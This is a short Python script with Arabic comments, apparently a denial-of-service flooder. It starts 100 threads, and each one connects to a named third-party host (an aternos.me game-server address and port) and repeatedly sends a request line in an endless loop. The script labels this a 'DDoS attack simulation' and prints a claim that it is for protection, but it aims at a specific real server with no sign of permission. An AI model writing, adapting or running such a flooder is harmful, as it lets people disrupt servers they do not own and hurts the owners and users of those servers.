import socket
import threading
import time
from colorama import Fore, init

# تهيئة مكتبة colorama لاستخدام الألوان
init(autoreset=True)

# إعدادات الخادم
ip = "FronzFR.aternos.me"
port = 49208
num_threads = 100  # عدد الخيوط (threads) لمحاكاة حركة المرور

# دالة لإرسال الطلبات إلى الخادم
def attack(ip, port):
    try:
        # إنشاء سوكيت للاتصال بالخادم
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # مهلة الاتصال
        
        # محاولة الاتصال بالخادم
        sock.connect((ip, port))
        
        # إرسال طلبات بشكل متكرر (محاكاة الهجوم)
        while True:
            sock.sendto(b"GET / HTTP/1.1\r\n", (ip, port))
            print(Fore.GREEN + "[+] Request sent to the server")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# دالة لبدء الهجوم باستخدام خيوط متعددة
def start_attack(ip, port, num_threads):
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(ip, port))
        threads.append(thread)
        thread.start()
        
    # انتظار حتى انتهاء جميع الخيوط
    for thread in threads:
        thread.join()

# تشغيل الاختبار
if __name__ == "__main__":
    print("الكود للأغراض حماية")
    print(f"[+] Starting DDoS attack simulation on {ip}:{port} with {num_threads} threads")
    
    start_time = time.time()
    start_attack(ip, port, num_threads)
    
    print(f"[+] Attack simulation finished in {time.time() - start_time:.2f} seconds")
